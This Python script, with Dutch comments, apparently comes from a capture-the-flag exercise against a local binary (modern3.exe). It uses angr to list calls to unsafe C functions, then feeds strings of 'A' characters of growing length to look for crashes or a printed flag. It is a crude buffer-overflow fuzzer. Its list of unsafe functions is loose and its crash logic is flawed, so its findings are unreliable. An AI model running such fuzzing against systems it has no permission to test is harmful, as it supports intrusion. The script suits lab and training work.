import angr
import subprocess
import string

def find_vulnerable_functions(binary_path):
    project = angr.Project(binary_path, auto_load_libs=False)
    cfg = project.analyses.CFGFast()

    vulnerable_functions = [
        "gets", "scanf", "strcpy", "gets_s", "fgets",
        # Voeg hier extra kwetsbare functies toe
        "sprintf", "strcat", "vsprintf", "strncat", "strncpy",
        "memcpy", "memmove", "bcopy", "strcpy_s", "strncpy_s",
        "swscanf", "vswscanf", "sscanf_s", "fscanf", "vfscanf",
        "vscanf", "sscanf", "wcsncpy", "wcsncat", "wcschr",
        "wcscpy", "wmemcpy", "wmempcpy", "wmemmove", "wcstok",
        "wcscat", "wcstombs", "wcstol", "wcstoul", "wcstod",
        "wcstok_s", "wcsncat_s", "wcsncpy_s", "wcscpy_s",
        "wcrtomb", "wcrtomb_s", "mbsrtowcs", "wcsrtombs",
        "getwd", "realpath", "get_current_dir_name",
        "getwd_s", "tempnam", "tmpnam", "tmpfile", "getenv",
        "bsearch", "fread", "fread_unlocked", "fwrite",
        "fwrite_unlocked", "fgetwc", "fputwc", "ungetc",
        "getchar", "putchar", "fgetc", "fputc", "gets_s",
        "gets_s", "getdelim", "getline", "fgetln", "fgets_unlocked"
    ]

    found_functions = []

    for function in cfg.kb.functions.values():
        if function.name in vulnerable_functions:
            found_functions.append(function)

    return found_functions

def print_progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end='\r')

def find_vulnerability_and_flag(binary_path):
    characters = string.printable  # Alle afdrukbare ASCII-karakters

    max_length = 200  # Startwaarde voor maximale payload-lengte
    total_iterations = max_length * len(characters)

    current_iteration = 0

    for length in range(1, max_length):
        for char in characters:
            current_iteration += 1
            print_progress_bar(current_iteration, total_iterations, prefix='Progress:', suffix='Complete', length=50)

            proc = subprocess.Popen([binary_path],
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)

            payload = ('A' * length + char + '\n').encode()
            proc.stdin.write(payload)
            proc.stdin.flush()

            output, error = proc.communicate()

            if proc.returncode != 0:
                print(f"\nPossible vulnerability found with payload length {length} and character '{char}'")
                max_length = length  # aanpassen van de maximale lengte aan op basis van de gevonden kwetsbaarheid
                continue

            output = output.decode()
            flag = None
            if "flag" in output.lower():
                flag = output.split("flag")[-1].strip().strip(":").strip()
            elif "Flag: " in output:
                flag = output.split("Flag: ")[1].strip()
            elif "FLAG: " in output:
                flag = output.split("FLAG: ")[1].strip()

            if flag:
                print(f"\nFlag found with payload '{payload.strip().decode()}':", flag)
                print(f"Buffergrootte: {length}")
                print("Reden van kwetsbaarheid: Bufferoverflow door onvoldoende validatie")
                return

    print("\nNo vulnerabilities or flags found.")

if __name__ == "__main__":
    binary_path = "C:\\Users\\vboxuser\\Desktop\\modern3\\modern3.exe"
    vulnerable_functions = find_vulnerable_functions(binary_path)

    if vulnerable_functions:
        print("Kwetsbare functies gevonden:")
        for function in vulnerable_functions:
            print(function.name)
    else:
        print("Geen kwetsbare functies gevonden.")

    find_vulnerability_and_flag(binary_path)
